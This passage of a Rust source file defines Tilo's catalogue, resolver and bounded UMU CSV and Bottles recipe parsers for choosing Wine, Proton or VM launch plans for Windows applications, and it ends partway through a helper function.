//! Policy data for launching Windows applications on Tilo.
//!
//! This crate deliberately does not launch a process, create a prefix, or
//! implement permissions.  It produces a fully specified launch plan for the
//! existing Tilo security/launcher services.  In particular, a
//! [`SecurityProfileRef`] is only a reference to that service's profile; it is
//! not a second capability or sandbox language.
//!
//! Resolution is intentionally conservative:
//!
//! * exact catalogue identity wins over weaker metadata matches;
//! * an unknown application gets an isolated Wine plan;
//! * Proton is selectable only from a catalogue recipe; and
//! * a VM can only be selected by an explicit caller request.

use std::collections::{BTreeMap, BTreeSet};

use serde::{Deserialize, Serialize};
use thiserror::Error;

/// Current on-disk catalogue schema.
pub const CATALOGUE_SCHEMA_VERSION: u16 = 1;
/// Current per-record schema.
pub const RECORD_VERSION: u32 = 1;
/// There is exactly one managed Windows guest per Tilo installation.
pub const WINDOWS_VM_RUNTIME_ID: &str = "windows-vm";

/// Stable reference into Tilo's existing security policy registry.
///
/// The catalogue stores this name so UI and launcher can show the effective
/// policy. It never interprets the name or grants access itself.
#[derive(Clone, Debug, Eq, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(transparent)]
pub struct SecurityProfileRef(String);

impl SecurityProfileRef {
    /// Construct a profile reference. Empty and path-like values are rejected
    /// because they would make policy ownership ambiguous.
    ///
    /// # Errors
    ///
    /// Returns [`CatalogueError::InvalidSecurityProfile`] for an empty,
    /// oversized, path-like, or whitespace-containing key.
    pub fn new(value: impl Into<String>) -> Result<Self, CatalogueError> {
        let value = value.into();
        if value.is_empty()
            || value.len() > 128
            || value.starts_with('.')
            || value.contains('/')
            || value.contains('\\')
            || value.chars().any(char::is_whitespace)
        {
            return Err(CatalogueError::InvalidSecurityProfile(value));
        }
        Ok(Self(value))
    }

    /// Return the registry key used by Tilo's security broker.
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

/// The compatibility execution layer.
#[derive(Clone, Copy, Debug, Eq, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Layer {
    /// A normal Wine prefix, managed as an isolated Tilo capsule.
    Wine,
    /// Proton through UMU/Steam Runtime. Never inferred for arbitrary apps.
    Proton,
    /// The one managed Windows guest. Never selected implicitly.
    Vm,
}

/// CPU architecture used by a Wine/Proton capsule.
#[derive(Clone, Copy, Debug, Default, Eq, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Architecture {
    Win32,
    #[default]
    Win64,
}

/// Exact runner selected for a launch.
#[derive(Clone, Debug, Eq, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
pub struct Runner {
    /// Human and log-facing runner family (for example `wine` or `umu-proton`).
    pub family: String,
    /// Immutable runtime identifier, such as `wine-11.0` or `proton-ge-10-20`.
    pub version: String,
}

impl Runner {
    /// Create a validated runner reference.
    ///
    /// # Errors
    ///
    /// Returns [`CatalogueError::InvalidValue`] when either token is empty,
    /// too long, or contains a control character.
    pub fn new(
        family: impl Into<String>,
        version: impl Into<String>,
    ) -> Result<Self, CatalogueError> {
        let family = family.into();
        let version = version.into();
        validate_token("runner family", &family)?;
        validate_token("runner version", &version)?;
        Ok(Self { family, version })
    }

    fn wine_default() -> Self {
        Self {
            family: String::from("wine"),
            version: String::from("system"),
        }
    }

    fn validate(&self) -> Result<(), CatalogueError> {
        validate_token("runner family", &self.family)?;
        validate_token("runner version", &self.version)
    }
}

/// Settings passed to the capsule or UMU adapter.
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
pub struct RunnerSettings {
    /// 32-bit or 64-bit Windows userspace.
    #[serde(default)]
    pub architecture: Architecture,
    /// Windows compatibility version exposed by the runner.
    #[serde(default = "default_windows_version")]
    pub windows_version: String,
    /// Runner-specific environment overrides. The launcher validates which
    /// variables are safe; this crate only preserves catalogue data.
    #[serde(default)]
    pub environment: BTreeMap<String, String>,
    /// DXVK/VKD3D and related graphics switches, interpreted by the runner.
    #[serde(default)]
    pub graphics: BTreeMap<String, String>,
    /// Optional Tilo runner feature names (for example `dotnet48`).
    #[serde(default)]
    pub components: BTreeSet<String>,
}

impl Default for RunnerSettings {
    fn default() -> Self {
        Self {
            architecture: Architecture::default(),
            windows_version: default_windows_version(),
            environment: BTreeMap::new(),
            graphics: BTreeMap::new(),
            components: BTreeSet::new(),
        }
    }
}

/// A reference to the Tilo-owned capsule or the single managed VM.
#[derive(Clone, Debug, Eq, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
pub struct Runtime {
    /// Stable local ID, not a filesystem path.
    pub id: String,
    pub layer: Layer,
}

impl Runtime {
    fn default_wine() -> Self {
        Self {
            id: String::from("wine-default"),
            layer: Layer::Wine,
        }
    }
}

/// Metadata used to identify an installed application.
#[derive(Clone, Debug, Default, Eq, PartialEq, Serialize, Deserialize)]
pub struct ApplicationQuery {
    /// Tilo package/store identity, when known.
    #[serde(default)]
    pub package_id: Option<String>,
    /// Windows `AppUserModelId` or other stable application ID.
    #[serde(default)]
    pub app_id: Option<String>,
    /// Steam/UMU numeric game ID.
    #[serde(default)]
    pub game_id: Option<String>,
    /// Store namespace from UMU (for example `egs` or `gog`).
    #[serde(default)]
    pub store: Option<String>,
    /// Store product code (`CODENAME`) within [`Self::store`].
    #[serde(default)]
    pub store_product: Option<String>,
    /// Executable filename or relative path.
    #[serde(default)]
    pub executable: Option<String>,
    /// SHA-256 of the executable bytes, when the launcher has verified them.
    #[serde(default)]
    pub executable_sha256: Option<String>,
    /// SHA-256 of an installer payload, when matching an installer before it
    /// has produced an executable.
    #[serde(default)]
    pub installer_sha256: Option<String>,
    #[serde(default)]
    pub publisher: Option<String>,
    #[serde(default)]
    pub product: Option<String>,
}

impl ApplicationQuery {
    pub fn executable(path: impl Into<String>) -> Self {
        Self {
            executable: Some(path.into()),
            ..Self::default()
        }
    }

    fn normalized(&self) -> NormalizedQuery {
        NormalizedQuery {
            package_id: normalize_optional(self.package_id.as_deref()),
            app_id: normalize_optional(self.app_id.as_deref()),
            game_id: normalize_optional(self.game_id.as_deref()),
            store: normalize_optional(self.store.as_deref()),
            store_product: normalize_optional(self.store_product.as_deref()),
            executable: normalize_executable(self.executable.as_deref()),
            executable_sha256: normalize_digest(self.executable_sha256.as_deref()),
            installer_sha256: normalize_digest(self.installer_sha256.as_deref()),
            publisher: normalize_optional(self.publisher.as_deref()),
            product: normalize_optional(self.product.as_deref()),
        }
    }
}

/// A catalogue identity matcher. Fields are `ANDed`, and a record may contain
/// several matchers (OR). Keeping this explicit makes precedence inspectable
/// in the UI and avoids fuzzy matching surprises.
#[derive(Clone, Debug, Default, Eq, PartialEq, Serialize, Deserialize)]
pub struct MatchKey {
    #[serde(default)]
    pub package_id: Option<String>,
    #[serde(default)]
    pub app_id: Option<String>,
    #[serde(default)]
    pub game_id: Option<String>,
    /// Store namespace from a compatibility source.
    #[serde(default)]
    pub store: Option<String>,
    /// Store product code within [`Self::store`].
    #[serde(default)]
    pub store_product: Option<String>,
    #[serde(default)]
    pub executable: Option<String>,
    /// Exact executable digest. This outranks every textual identity key.
    #[serde(default)]
    pub executable_sha256: Option<String>,
    /// Exact installer payload digest.
    #[serde(default)]
    pub installer_sha256: Option<String>,
    #[serde(default)]
    pub publisher: Option<String>,
    #[serde(default)]
    pub product: Option<String>,
}

impl MatchKey {
    /// Match the key after applying Tilo's case/whitespace/path normalization.
    pub fn matches(&self, query: &ApplicationQuery) -> bool {
        let key = self.normalized();
        key.has_identity() && key.matches(&query.normalized())
    }

    fn normalized(&self) -> NormalizedKey {
        NormalizedKey {
            package_id: normalize_optional(self.package_id.as_deref()),
            app_id: normalize_optional(self.app_id.as_deref()),
            game_id: normalize_optional(self.game_id.as_deref()),
            store: normalize_optional(self.store.as_deref()),
            store_product: normalize_optional(self.store_product.as_deref()),
            executable: normalize_executable(self.executable.as_deref()),
            executable_sha256: normalize_digest(self.executable_sha256.as_deref()),
            installer_sha256: normalize_digest(self.installer_sha256.as_deref()),
            publisher: normalize_optional(self.publisher.as_deref()),
            product: normalize_optional(self.product.as_deref()),
        }
    }
}

/// A catalog record's launch recipe.
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
pub struct Recipe {
    pub layer: Layer,
    pub runner: Runner,
    #[serde(default)]
    pub settings: RunnerSettings,
    /// Existing Tilo security profile; no permissions are defined here.
    pub security_profile: SecurityProfileRef,
    /// Proton requires a recipe so arbitrary apps cannot drift into Proton.
    #[serde(default)]
    pub proton_recipe: Option<String>,
}

impl Recipe {
    fn validate(&self, id: &str) -> Result<(), CatalogueError> {
        self.runner.validate()?;
        validate_settings(&self.settings)?;
        validate_security_profile(&self.security_profile)?;
        if self.layer == Layer::Proton {
            let Some(recipe) = self.proton_recipe.as_deref() else {
                return Err(CatalogueError::ProtonRecipeRequired(id.to_owned()));
            };
            validate_token("Proton recipe", recipe)?;
            if self.runner.family != "umu-proton" && self.runner.family != "proton" {
                return Err(CatalogueError::InvalidProtonRunner {
                    id: id.to_owned(),
                    family: self.runner.family.clone(),
                });
            }
        } else if self.proton_recipe.is_some() {
            return Err(CatalogueError::UnexpectedProtonRecipe(id.to_owned()));
        }
        if self.layer == Layer::Vm && self.runner.family != "windows-vm" {
            return Err(CatalogueError::InvalidVmRunner {
                id: id.to_owned(),
                family: self.runner.family.clone(),
            });
        }
        if self.layer == Layer::Wine && self.runner.family != "wine" {
            return Err(CatalogueError::InvalidWineRunner {
                id: id.to_owned(),
                family: self.runner.family.clone(),
            });
        }
        Ok(())
    }
}

/// Origin of a record. This is ordering metadata, not a permission grant.
#[derive(Clone, Copy, Debug, Default, Eq, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Provenance {
    /// Shipped by Tilo and reviewed as part of the OS image.
    #[default]
    BuiltIn,
    /// Supplied by a runner/vendor integration.
    Vendor,
    /// Imported from a community compatibility source.
    Community,
    /// Explicitly authored by the user.
    User,
}

/// Bottles' compatibility grade, retained as explainable catalogue metadata.
#[derive(Clone, Copy, Debug, Default, Eq, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum CompatibilityGrade {
    Platinum,
    Gold,
    Silver,
    Bronze,
    Garbage,
    #[default]
    Unknown,
}

impl CompatibilityGrade {
    /// Parse the grade labels used by Bottles recipes.
    #[must_use]
    pub fn parse(value: &str) -> Self {
        match value.trim().to_ascii_lowercase().as_str() {
            "platinum" => Self::Platinum,
            "gold" => Self::Gold,
            "silver" => Self::Silver,
            "bronze" => Self::Bronze,
            "garbage" | "borked" => Self::Garbage,
            _ => Self::Unknown,
        }
    }

    /// A short human explanation suitable for the route inspector.
    #[must_use]
    pub const fn explanation(self) -> &'static str {
        match self {
            Self::Platinum => "Runs without known compatibility changes.",
            Self::Gold => "Runs with small, documented compatibility changes.",
            Self::Silver => "Runs with notable compatibility changes.",
            Self::Bronze => "Runs inconsistently or with substantial limitations.",
            Self::Garbage => "The recipe is known not to work reliably.",
            Self::Unknown => "No compatibility grade is available.",
        }
    }
}

impl Provenance {
    fn score(self) -> u8 {
        match self {
            Self::BuiltIn => 3,
            Self::Vendor => 2,
            Self::Community => 1,
            Self::User => 4,
        }
    }
}

/// One versioned catalogue entry.
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
pub struct Record {
    pub id: String,
    #[serde(default = "default_record_version")]
    pub version: u32,
    /// Origin metadata used as a deterministic tie-breaker.
    #[serde(default)]
    pub provenance: Provenance,
    /// Set only by the trusted catalogue loader after signature verification;
    /// this crate does not verify signatures or create a security boundary.
    #[serde(default)]
    pub signed: bool,
    /// Optional compatibility grade from a Bottles recipe.
    #[serde(default)]
    pub compatibility_grade: Option<CompatibilityGrade>,
    #[serde(default)]
    pub matches: Vec<MatchKey>,
    pub recipe: Recipe,
}

/// Versioned persisted catalogue.
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
pub struct Catalogue {
    pub schema_version: u16,
    #[serde(default)]
    pub records: Vec<Record>,
}

impl Catalogue {
    /// Validate all data before it can influence launching. Unknown schema,
    /// duplicate IDs, malformed keys and malformed recipes fail closed.
    pub fn validate(&self) -> Result<(), CatalogueError> {
        if self.schema_version != CATALOGUE_SCHEMA_VERSION {
            return Err(CatalogueError::UnsupportedSchema(self.schema_version));
        }
        let mut ids = BTreeSet::new();
        for record in &self.records {
            validate_token("record id", &record.id)?;
            if record.version != RECORD_VERSION {
                return Err(CatalogueError::UnsupportedRecordVersion {
                    id: record.id.clone(),
                    version: record.version,
                });
            }
            if !ids.insert(record.id.clone()) {
                return Err(CatalogueError::DuplicateRecord(record.id.clone()));
            }
            if record.matches.is_empty() {
                return Err(CatalogueError::NoMatchKeys(record.id.clone()));
            }
            for key in &record.matches {
                validate_key(key, &record.id)?;
            }
            record.recipe.validate(&record.id)?;
        }
        Ok(())
    }

    /// Parse and validate a JSON catalogue before returning it.
    ///
    /// # Errors
    ///
    /// Returns [`CatalogueError::InvalidJson`] for malformed JSON, or a
    /// validation error when parsed data is unsupported or unsafe.
    pub fn from_json(input: &str) -> Result<Self, CatalogueError> {
        let catalogue: Self = serde_json::from_str(input)
            .map_err(|source| CatalogueError::InvalidJson(source.to_string()))?;
        catalogue.validate()?;
        Ok(catalogue)
    }

    /// Resolve Wine/Proton routes. VM records are ignored unless the caller
    /// explicitly opts into VM fallback using [`Resolver::resolve`].
    pub fn resolver(&self) -> Result<Resolver<'_>, CatalogueError> {
        self.validate()?;
        Ok(Resolver { catalogue: self })
    }
}

/// Whether the caller explicitly authorizes using the one Windows VM.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum VmFallback {
    /// Never select the VM, including when a VM recipe matches.
    Disabled,
    /// The user explicitly requested VM fallback for this launch.
    Explicit,
}

/// Deterministic resolver over a validated catalogue.
pub struct Resolver<'a> {
    catalogue: &'a Catalogue,
}

/// Result of selecting an application route.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct LaunchPlan {
    pub record_id: Option<String>,
    pub match_kind: MatchKind,
    pub runtime: Runtime,
    pub runner: Runner,
    pub settings: RunnerSettings,
    pub security_profile: SecurityProfileRef,
    pub proton_recipe: Option<String>,
    pub compatibility_grade: Option<CompatibilityGrade>,
}

/// Why a catalogue record won.
#[derive(Clone, Copy, Debug, Eq, Ord, PartialEq, PartialOrd)]
pub enum MatchKind {
    DefaultWine,
    ProductPublisher,
    Executable,
    ExecutableDigest,
    GameId,
    StoreProduct,
    AppId,
    PackageId,
}

impl MatchKind {
    fn score(self) -> u8 {
        match self {
            Self::DefaultWine => 0,
            Self::ProductPublisher => 1,
            Self::Executable => 2,
            Self::GameId => 3,
            Self::AppId => 4,
            Self::StoreProduct => 5,
            Self::PackageId => 6,
            Self::ExecutableDigest => 7,
        }
    }
}

impl Resolver<'_> {
    /// Resolve a query. VM selection requires [`VmFallback::Explicit`].
    pub fn resolve(&self, query: &ApplicationQuery, vm_fallback: VmFallback) -> LaunchPlan {
        let query = query.normalized();
        let mut best: Option<(&Record, MatchKind, usize)> = None;
        for (index, record) in self.catalogue.records.iter().enumerate() {
            let Some(kind) = record_match_kind(record, &query) else {
                continue;
            };
            if record.recipe.layer == Layer::Vm && vm_fallback != VmFallback::Explicit {
                continue;
            }
            let candidate = (record, kind, index);
            let should_replace = best.is_none_or(|(current, current_kind, current_index)| {
                (
                    kind.score(),
                    u8::from(record.signed),
                    record.provenance.score(),
                    std::cmp::Reverse(record.id.as_str()),
                    std::cmp::Reverse(index),
                ) > (
                    current_kind.score(),
                    u8::from(current.signed),
                    current.provenance.score(),
                    std::cmp::Reverse(current.id.as_str()),
                    std::cmp::Reverse(current_index),
                )
            });
            if should_replace {
                best = Some(candidate);
            }
        }

        let Some((record, kind, _)) = best else {
            return default_wine_plan();
        };
        plan_from_record(record, kind)
    }
}

/// A row from UMU's upstream compatibility CSV. The parser intentionally
/// keeps only the stable identity columns; all other columns are preserved by
/// neither the resolver nor the launcher until they have an explicit schema.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct UmuCsvRow {
    pub title: String,
    pub store: String,
    pub codename: String,
    pub umu_id: String,
}

impl UmuCsvRow {
    /// Convert the UMU identity into a catalogue query.
    #[must_use]
    pub fn query(&self) -> ApplicationQuery {
        ApplicationQuery {
            app_id: Some(self.codename.clone()),
            game_id: Some(self.umu_id.clone()),
            store: Some(self.store.clone()),
            store_product: Some(self.codename.clone()),
            product: Some(self.title.clone()),
            ..ApplicationQuery::default()
        }
    }
}

/// Parse UMU's pinned CSV format (including quoted RFC-4180 fields).
///
/// # Errors
///
/// Returns [`CatalogueError::InvalidUmuCsv`] for malformed CSV, missing
/// required headers, duplicate headers, oversized input, or incomplete rows.
pub fn parse_umu_csv(input: &str) -> Result<Vec<UmuCsvRow>, CatalogueError> {
    const MAX_BYTES: usize = 8 * 1024 * 1024;
    const MAX_ROWS: usize = 100_000;
    if input.len() > MAX_BYTES {
        return Err(CatalogueError::InvalidUmuCsv(
            "input exceeds 8 MiB".to_owned(),
        ));
    }
    let rows = parse_csv_rows(input)?;
    let Some(header) = rows.first() else {
        return Err(CatalogueError::InvalidUmuCsv("missing header".to_owned()));
    };
    let mut indexes = BTreeMap::new();
    for (index, field) in header.iter().enumerate() {
        let name = field.trim().to_ascii_uppercase();
        if name.is_empty() || indexes.insert(name.clone(), index).is_some() {
            return Err(CatalogueError::InvalidUmuCsv(
                "invalid or duplicate header".to_owned(),
            ));
        }
    }
    let required = ["TITLE", "STORE", "CODENAME", "UMU_ID"];
    if required.iter().any(|name| !indexes.contains_key(*name)) {
        return Err(CatalogueError::InvalidUmuCsv(
            "required headers are TITLE, STORE, CODENAME, UMU_ID".to_owned(),
        ));
    }
    let mut result = Vec::new();
    for row in rows.iter().skip(1) {
        if row.iter().all(|field| field.trim().is_empty()) {
            continue;
        }
        if result.len() >= MAX_ROWS || row.len() != header.len() {
            return Err(CatalogueError::InvalidUmuCsv(
                "invalid row width or row count".to_owned(),
            ));
        }
        let field = |name: &str| {
            indexes
                .get(name)
                .and_then(|index| row.get(*index))
                .map(|value| value.trim().to_owned())
                .filter(|value| !value.is_empty())
        };
        let row = UmuCsvRow {
            title: field("TITLE").ok_or_else(|| missing_umu_field("TITLE"))?,
            store: field("STORE").ok_or_else(|| missing_umu_field("STORE"))?,
            codename: field("CODENAME").ok_or_else(|| missing_umu_field("CODENAME"))?,
            umu_id: field("UMU_ID").ok_or_else(|| missing_umu_field("UMU_ID"))?,
        };
        for (name, value) in [
            ("UMU title", &row.title),
            ("UMU store", &row.store),
            ("UMU codename", &row.codename),
            ("UMU ID", &row.umu_id),
        ] {
            validate_token(name, value)?;
        }
        result.push(row);
    }
    Ok(result)
}

/// Turn UMU rows into Proton records using the Tilo runner/security references
/// supplied by the caller. The records are marked vendor provenance and remain
/// unsigned until a trusted catalogue loader authenticates the source.
///
/// # Errors
///
/// Returns a CSV or catalogue validation error when a row, identity, runner,
/// or security-profile reference is malformed.
pub fn proton_records_from_umu_csv(
    input: &str,
    runner: &Runner,
    security_profile: &SecurityProfileRef,
    settings: &RunnerSettings,
) -> Result<Vec<Record>, CatalogueError> {
    let rows = parse_umu_csv(input)?;
    let records = rows
        .into_iter()
        .map(|row| {
            let slug = umu_slug(&row)?;
            Ok(Record {
                id: format!("umu-{slug}"),
                version: RECORD_VERSION,
                provenance: Provenance::Vendor,
                signed: false,
                compatibility_grade: None,
                // STORE + CODENAME is the upstream product identity. Keep
                // UMU_ID as a direct fallback for metadata discovered from
                // the UMU launcher itself.
                matches: vec![
                    MatchKey {
                        store: Some(row.store.clone()),
                        store_product: Some(row.codename.clone()),
                        ..MatchKey::default()
                    },
                    MatchKey {
                        game_id: Some(row.umu_id.clone()),
                        ..MatchKey::default()
                    },
                ],
                recipe: Recipe {
                    layer: Layer::Proton,
                    runner: runner.clone(),
                    settings: settings.clone(),
                    security_profile: security_profile.clone(),
                    proton_recipe: Some(format!("umu-{}", row.umu_id)),
                },
            })
        })
        .collect::<Result<Vec<_>, CatalogueError>>()?;
    Catalogue {
        schema_version: CATALOGUE_SCHEMA_VERSION,
        records: records.clone(),
    }
    .validate()?;
    Ok(records)
}

/// Safe metadata extracted from one Bottles recipe program. Installer steps,
/// URLs, paths and commands are intentionally absent from this type.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct BottlesProgram {
    pub name: String,
    pub executable: String,
    pub architecture: Architecture,
    pub grade: CompatibilityGrade,
    pub dependencies: BTreeSet<String>,
    pub dxvk: bool,
    pub vkd3d: bool,
    pub sync: Option<String>,
}

impl BottlesProgram {
    /// Explain the imported grade and runner settings for the route inspector.
    #[must_use]
    pub fn explanation(&self) -> String {
        let mut explanation = self.grade.explanation().to_owned();
        if !self.dependencies.is_empty() {
            explanation.push_str(" Components: ");
            explanation.push_str(
                &self
                    .dependencies
                    .iter()
                    .cloned()
                    .collect::<Vec<_>>()
                    .join(", "),
            );
            explanation.push('.');
        }
        explanation
    }
}

/// Parse the bounded, metadata-only subset of a Bottles recipe/index entry.
///
/// This is a bounded YAML reader for the stable public fields used
/// by Bottles recipes. It does not attempt to interpret YAML tags, anchors, or
/// installer instructions; unknown fields are ignored.
///
/// # Errors
///
/// Returns [`CatalogueError::InvalidBottlesRecipe`] for oversized, malformed,
/// or metadata-free input.
#[allow(
    clippy::too_many_lines,
    reason = "the bounded parser keeps its accepted field grammar together"
)]
pub fn parse_bottles_recipe(input: &str) -> Result<Vec<BottlesProgram>, CatalogueError> {
    const MAX_BYTES: usize = 2 * 1024 * 1024;
    const MAX_LINES: usize = 20_000;
    if input.len() > MAX_BYTES {
        return Err(CatalogueError::InvalidBottlesRecipe(
            "input exceeds 2 MiB".to_owned(),
        ));
    }
    let mut programs = Vec::new();
    let mut defaults = BottlesBuilder::new("Bottles application");
    let mut current: Option<BottlesBuilder> = None;
    let mut programs_indent: Option<usize> = None;
    let mut ignored_indent: Option<usize> = None;
    let mut list_section: Option<(String, usize)> = None;
    for (line_number, line) in input.lines().enumerate() {
        if line_number >= MAX_LINES {
            return Err(CatalogueError::InvalidBottlesRecipe(
                "line count exceeds limit".to_owned(),
            ));
        }
        if line.contains('\t') {
            return Err(CatalogueError::InvalidBottlesRecipe(
                "tabs are not supported".to_owned(),
            ));
        }
        let indent = line.bytes().take_while(|byte| *byte == b' ').count();
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        if ignored_indent.is_some_and(|base| indent > base) {
            continue;
        }
        ignored_indent = None;
        let Some((raw_key, raw_value)) = trimmed.split_once(':') else {
            if let Some((section, section_indent)) = &list_section
                && indent > *section_indent
                && trimmed.starts_with("- ")
            {
                if (section == "DEPENDENCIES" || section == "COMPONENTS")
                    && let Some(value) = trimmed
                        .get(2..)
                        .and_then(|value| safe_yaml_scalar(value.trim()))
                {
                    if let Some(builder) = current.as_mut() {
                        builder.dependencies.insert(value);
                    } else {
                        defaults.dependencies.insert(value);
                    }
                }
                continue;
            }
            return Err(CatalogueError::InvalidBottlesRecipe(format!(
                "line {} is not a key/value",
                line_number.saturating_add(1)
            )));
        };
        let key = raw_key.trim().to_ascii_uppercase();
        let value = safe_yaml_scalar(raw_value.trim());
        if matches!(
            key.as_str(),
            "STEPS" | "INSTALL" | "INSTALLATION" | "DOWNLOADS"
        ) {
            ignored_indent = Some(indent);
            list_section = None;
            continue;
        }
        if key == "PROGRAMS" {
            programs_indent = Some(indent);
            list_section = None;
            continue;
        }
        if key == "DEPENDENCIES" || key == "COMPONENTS" {
            list_section = Some((key, indent));
            if let Some(value) = value {
                if let Some(builder) = current.as_mut() {
                    add_inline_dependencies(&mut builder.dependencies, &value);
                } else {
                    add_inline_dependencies(&mut defaults.dependencies, &value);
                }
            }
            continue;
        }
        if programs_indent.is_some_and(|base| indent > base)
            && value.is_none()
            && !is_metadata_key(&key)
        {
            if let Some(builder) = current.take() {
                programs.push(builder.finish()?);
            }
            let mut builder = defaults.clone();
            builder.seen_fields.clear();
            raw_key.trim().clone_into(&mut builder.name);
            current = Some(builder);
            list_section = None;
            continue;
        }
        if key == "EXECUTABLE" || key == "PROGRAM" || key == "EXE" {
            if let Some(executable) = value.as_deref().and_then(safe_executable) {
                if let Some(builder) = current.as_mut() {
                    if !builder.seen_fields.insert("EXECUTABLE".to_owned()) {
                        return Err(CatalogueError::InvalidBottlesRecipe(
                            "duplicate executable field".to_owned(),
                        ));
                    }
                    builder.executable = Some(executable.to_owned());
                } else {
                    let mut builder = defaults.clone();
                    builder.seen_fields.clear();
                    builder.seen_fields.insert("EXECUTABLE".to_owned());
                    builder.executable = Some(executable.to_owned());
                    current = Some(builder);
                }
            }
            continue;
        }
        if let Some(builder) = current.as_mut() {
            apply_bottles_field(builder, &key, value.as_deref())?;
        } else {
            apply_bottles_field(&mut defaults, &key, value.as_deref())?;
        }
    }
    if let Some(builder) = current {
        programs.push(builder.finish()?);
    }
    if programs.is_empty() {
        return Err(CatalogueError::InvalidBottlesRecipe(
            "no safe executable metadata found".to_owned(),
        ));
    }
    Ok(programs)
}

/// Convert safe Bottles metadata into Wine records. Imported records are
/// community provenance and unsigned until a trusted catalogue loader verifies
/// the source.
///
/// # Errors
///
/// Returns an error if the recipe has no safe executable, contains malformed
/// metadata, or the supplied runner/security profile fails validation.
pub fn wine_records_from_bottles_recipe(
    input: &str,
    runner: &Runner,
    security_profile: &SecurityProfileRef,
) -> Result<Vec<Record>, CatalogueError> {
    let programs = parse_bottles_recipe(input)?;
    let records = programs
        .into_iter()
        .map(|program| {
            let id = format!(
                "bottles-{}",
                bottles_slug(&program.name, &program.executable)
            );
            let mut graphics = BTreeMap::new();
            graphics.insert("dxvk".to_owned(), program.dxvk.to_string());
            graphics.insert("vkd3d".to_owned(), program.vkd3d.to_string());
            if let Some(sync) = &program.sync {
                graphics.insert("sync".to_owned(), sync.clone());
            }
            Ok(Record {
                id,
                version: RECORD_VERSION,
                provenance: Provenance::Community,
                signed: false,
                compatibility_grade: Some(program.grade),
                matches: vec![MatchKey {
                    executable: Some(program.executable.clone()),
                    ..MatchKey::default()
                }],
                recipe: Recipe {
                    layer: Layer::Wine,
                    runner: runner.clone(),
                    settings: RunnerSettings {
                        architecture: program.architecture,
                        graphics,
                        components: program.dependencies,
                        ..RunnerSettings::default()
                    },
                    security_profile: security_profile.clone(),
                    proton_recipe: None,
                },
            })
        })
        .collect::<Result<Vec<_>, CatalogueError>>()?;
    Catalogue {
        schema_version: CATALOGUE_SCHEMA_VERSION,
        records: records.clone(),
    }
    .validate()?;
    Ok(records)
}

#[derive(Clone, Debug)]
struct BottlesBuilder {
    name: String,
    executable: Option<String>,
    architecture: Architecture,
    grade: CompatibilityGrade,
    dependencies: BTreeSet<String>,
    dxvk: bool,
    vkd3d: bool,
    sync: Option<String>,
    seen_fields: BTreeSet<String>,
}

impl BottlesBuilder {
    fn new(name: &str) -> Self {
        Self {
            name: name.to_owned(),
            executable: None,
            architecture: Architecture::default(),
            grade: CompatibilityGrade::default(),
            dependencies: BTreeSet::new(),
            dxvk: false,
            vkd3d: false,
            sync: None,
            seen_fields: BTreeSet::new(),
        }
    }

    fn finish(self) -> Result<BottlesProgram, CatalogueError> {
        let executable = self.executable.ok_or_else(|| {
            CatalogueError::InvalidBottlesRecipe("program has no safe executable".to_owned())
        })?;
        Ok(BottlesProgram {
            name: self.name,
            executable,
            architecture: self.architecture,
            grade: self.grade,
            dependencies: self.dependencies,
            dxvk: self.dxvk,
            vkd3d: self.vkd3d,
            sync: self.sync,
        })
    }
}

fn is_metadata_key(key: &str) -> bool {
    matches!(
        key,
        "NAME" | "SLUG" | "ARCH" | "ARCHITECTURE" | "GRADE" | "DXVK" | "VKD3D" | "SYNC"
    )
}

fn safe_yaml_scalar(value: &str) -> Option<String> {
    let value = value.trim();
    if value.is_empty() {
        return None;
    }
    let value = value
        .strip_prefix('"')
        .and_then(|value| value.strip_suffix('"'))
        .or_else(|| {
            value
                .strip_prefix('\'')
                .and_then(|value| value.strip_suffix('\''))
        })
        .unwrap_or(value)
        .trim();
    if value.is_empty() || value.len() > 512 || value.chars().any(char::is_control) {
        return None;
    }
    Some(value.to_owned())
}

fn safe_executable(value: &str) -> Option<&str> {
    let value = value.trim();
    if value.is_empty()
        || value.len() > 255
        || value.chars().any(char::is_control)
        || value.contains('/')
        || value.contains('\\')
        || value.contains(':')
        || value.starts_with('.')
        || value.contains("..")
        || !(value.to_ascii_lowercase().ends_with(".exe")
            || value.to_ascii_lowercase().ends_with(".com"))
    {
        return None;
    }
    Some(value)
}

fn apply_bottles_field(
    builder: &mut BottlesBuilder,
    key: &str,
    value: Option<&str>,
) -> Result<(), CatalogueError> {
    let Some(value) = value else { return Ok(()) };
    let recognized = is_metadata_key(key);
    if recognized && !builder.seen_fields.insert(key.to_owned()) {
        return Err(CatalogueError::InvalidBottlesRecipe(format!(
            "duplicate metadata field {key}"
        )));
    }
    match key {
        "NAME" if builder.name == "Bottles application" => value.clone_into(&mut builder.name),
        "ARCH" | "ARCHITECTURE" => {
            builder.architecture =
                if value.eq_ignore_ascii_case("win32") || value.eq_ignore_ascii_case("32bit") {
                    Architecture::Win32
                } else {
                    Architecture::Win64
                };
        }
        "GRADE" => builder.grade = CompatibilityGrade::parse(value),
        "DXVK" => builder.dxvk = parse_bool(value),
        "VKD3D" => builder.vkd3d = parse_bool(value),
        "SYNC" => builder.sync = safe_yaml_scalar(value),
        _ => {}
    }
    Ok(())
}

fn add_inline_dependencies(target: &mut BTreeSet<String>, value: &str) {
    let value = value.trim().trim_start_matches('[').trim_end_matches(']');
    for component in value.split(',') {
        if let Some(component) = safe_yaml_scalar(component) {
            target.insert(component);
        }
    }
}

fn parse_bool(value: &str) -> bool {
    matches!(
